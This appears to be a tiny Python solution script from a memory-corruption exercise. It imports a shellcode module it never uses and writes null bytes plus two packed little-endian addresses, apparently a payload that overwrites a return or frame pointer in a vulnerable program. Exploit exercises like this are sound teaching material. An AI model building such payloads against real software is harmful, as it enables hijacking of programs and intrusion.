#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"\0\0\0\0")
sys.stdout.buffer.write(pack("<I", 0xfffeb314))
sys.stdout.buffer.write(pack("<I", 0x0080488bc))